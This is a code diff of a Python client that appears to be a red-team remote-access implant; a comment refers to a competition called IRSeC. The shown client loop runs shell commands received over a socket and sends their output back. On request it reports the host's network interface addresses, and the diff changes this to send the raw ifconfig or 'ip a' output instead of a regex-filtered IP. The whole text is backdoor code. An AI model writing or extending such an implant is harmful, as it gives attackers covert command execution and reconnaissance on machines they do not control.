@@ -1,8 +1,7 @@
 import socket, subprocess, os, sys, random
 from threading import Thread
 from time import sleep
-import random, re
-import time
+import random
 
 
 #######
@@ -238,14 +237,7 @@ def clientLoop():
                         out = subprocess.run("ifconfig | grep inet", shell=True,capture_output=True,text=True).stdout
                     else:
                         out = subprocess.run("ip a | grep inet", shell=True,capture_output=True,text=True).stdout
-                regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC, look for 172.X.X.X, or 10.X.X.X
-                regex_cloud = re.compile(r'(127\.\d{1,2}\.\d{1,3}\.\d{1,3})')
-                out = str(out).strip()
-                try:
-                    IP = regex.search(out)[0] #try to find local IP
-                except:
-                    IP = regex_cloud.search(out)[0] #if it's the cloud, run that regex
-                s.send(str(IP).encode())
+                s.send(str(out).encode())
             else: #if the user doesn't want to perform a special action, run the command and capture the output
                 #if the command runs for longer than 5 seconds, timeout
                 try:
